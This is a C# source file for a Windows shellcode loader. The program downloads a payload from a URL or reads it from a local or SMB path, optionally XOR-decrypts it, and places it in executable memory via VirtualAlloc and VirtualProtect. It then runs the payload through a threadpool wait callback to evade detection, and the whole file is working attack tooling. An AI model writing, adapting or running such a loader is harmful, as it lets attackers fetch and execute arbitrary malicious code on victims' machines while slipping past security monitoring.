using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.IO;
using System.Threading;

class Program
{
    // Constants for VirtualAlloc
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_READ = 0x20;

    delegate void PTP_WAIT_CALLBACK(IntPtr pInstance, IntPtr Context, IntPtr ptp_w);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetEvent(IntPtr hEvent);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void Sleep(uint dwMilliseconds);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int RtlMoveMemory(IntPtr dest, byte[] src, uint size);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThreadpoolWait(PTP_WAIT_CALLBACK pfnwa, IntPtr pv, IntPtr pcbe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void SetThreadpoolWait(IntPtr ptpw, IntPtr hEvent, IntPtr pftDueTime);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void WaitForThreadpoolWaitCallbacks(IntPtr ptpw, bool fCancelPendingCallbacks);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: Program.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        RtlMoveMemory(hAlloc, shellcode, (uint)shellcode.Length);

        uint oldProtect;
        if (!VirtualProtect(hAlloc, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect))
        {
            Console.WriteLine($"[Failed] VirtualProtect failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        IntPtr hEvent = CreateEvent(IntPtr.Zero, false, false, null);
        IntPtr ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(PTP_WAIT_CALLBACK)), IntPtr.Zero, IntPtr.Zero);

        SetThreadpoolWait(ptp_w, hEvent, IntPtr.Zero);

        // Send events so the Threadpool Wait Callback has a chance to "catch" them and run
        SetEvent(hEvent);
        WaitForThreadpoolWaitCallbacks(ptp_w, false);
        SetEvent(hEvent);

        while (true)
        {
            Sleep(9000);
        }
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
